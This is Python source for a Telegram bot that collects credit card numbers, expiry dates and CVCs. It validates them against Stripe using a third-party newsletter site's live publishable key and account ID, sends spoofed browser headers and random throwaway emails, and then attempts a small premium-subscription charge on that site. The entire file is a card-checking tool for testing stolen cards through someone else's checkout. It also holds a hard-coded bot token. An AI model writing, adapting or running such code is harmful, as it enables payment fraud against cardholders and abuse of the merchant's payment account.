
import requests
import time
import random
import string

API_TOKEN = '8072279299:AAH0SaBdoqFOIP-qukCCfvCD7LkqefKlu9Q'
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def handle_start(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, 
        "Please send your credit card details in this format:\n"
        "`CARD_NUMBER,MM,YY,CVC`\n"
        "Example: 5396890201065443,12,28,952", parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_card_details(message):
    chat_id = message.chat.id
    text = message.text.strip()
    parts = [part.strip() for part in text.split(',')]
    
    if len(parts) != 4:
        bot.send_message(chat_id, "Invalid format. Please send details as: CARD_NUMBER,MM,YY,CVC")
        return
    
    card_number, exp_month, exp_year, cvc = parts

    # Generate email
    email_prefix = generate_random_string()
    email = f"{email_prefix}@gmail.com"

    # Call your payment process with these details
    perform_payment_and_upgrade(
        chat_id=chat_id,
        email=email,
        card_number=card_number,
        cvc=cvc,
        exp_month=exp_month,
        exp_year=exp_year
    )

def generate_random_string():
    upper = random.choice(string.ascii_uppercase)
    lowers = ''.join(random.choices(string.ascii_lowercase, k=9))
    digits = ''.join(random.choices(string.digits, k=2))
    return upper + lowers + digits

def perform_payment_and_upgrade(chat_id, email, card_number, cvc, exp_month, exp_year):
    # 1. Create Payment Method
    stripe_url = "https://api.stripe.com/v1/payment_methods"
    headers_stripe = {
        "Host": "api.stripe.com",
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "Sec-Fetch-Site": "same-site",
        "Origin": "https://js.stripe.com",
        "Sec-Fetch-Mode": "cors",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
        "Referer": "https://js.stripe.com/",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br"
    }

    data_stripe = {
        "type": "card",
        "billing_details[email]": email,
        "billing_details[address][postal_code]": "10080",
        "card[number]": card_number,
        "card[cvc]": cvc,
        "card[exp_month]": exp_month,
        "card[exp_year]": exp_year,
        "guid": "ca37b869-baff-4609-bfd3-61a2168fdef748f4b0",
        "muid": "03a73ed1-38c6-48e6-a0f1-69ac8bcdf3a9a61c51",
        "sid": "106795cc-523a-42d1-959c-c8b9db428911665224",
        "pasted_fields": "number",
        "payment_user_agent": "stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; card-element",
        "referrer": "https://nicdetommaso.beehiiv.com/",
        "time_on_page": "70570",
        "key": "pk_live_51IekcQKHPFAlBzyyGNBguT5BEI7NEBqrTxJhsYN1FI1lQb9iWxU5U2OXfi744NEMx5p7EDXh08YXrudrZkkG9bGc00ZCrkXrxL",
        "_stripe_account": "acct_1P8VrT2c8u2J1Y94"
    }

    try:
        response = requests.post(stripe_url, headers=headers_stripe, data=data_stripe)
        result_json = response.json()
        status = ''
        message = ''
        if 'error' in result_json:
            # Card declined or other error
            status = 'declined'
            message = result_json['error'].get('message', 'Card declined or error occurred.')
        else:
            # If no error, assume success
            status = 'success'
            message = 'Card accepted, payment method created.'

        # Send response back to user
        bot.send_message(chat_id, f"Card status: {status}\nMessage: {message}")

        # Proceed with the upgrade request only if success
        if status == 'success':
            # Make the upgrade request
            upgrade_url = "https://nicdetommaso.beehiiv.com/upgrade?_data=routes%2Fupgrade"
            headers_upgrade = {
                "Host": "nicdetommaso.beehiiv.com",
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
                "Sec-Fetch-Site": "same-origin",
                "Origin": "https://nicdetommaso.beehiiv.com",
                "Referer": "https://nicdetommaso.beehiiv.com/upgrade",
                "Sec-Fetch-Mode": "cors",
                "Sentry-Trace": "29a1af691ba94ae7949a7bc51d8ad34c-9214c8aa3262176d-0",
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
                # Additional cookies if needed
                "Cookie": "__stripe_mid=...; __stripe_sid=..."
            }
            data_upgrade = {
                "email": email,
                "force_three_d_secure": "false",
                "price_id": "33af17df-aeeb-4c52-a211-d87594ee966b",
                "premium_offer_id": "",
                "last_resource_guid": "",
                "upgrade_error_message": "Oops%2C+something+went+wrong.",
                "upgrade_success_message": "You+are+now+a+premium+subscriber",
                "payment_method": 'pm_test123',  # Or store the actual PM ID if needed
                "tax_id": "",
                "tax_id_type": "",
                "amount_cents": "100"
            }
            response2 = requests.post(upgrade_url, headers=headers_upgrade, data=data_upgrade)
            resp_json = response2.json()
            status2 = resp_json.get('status')
            message2 = resp_json.get('message')
            bot.send_message(chat_id, f"Upgrade Status: {status2}\nMessage: {message2}")

    except Exception as e:
        bot.send_message(chat_id, f"Error during payment processing: {e}")

# Run the bot
bot.polling()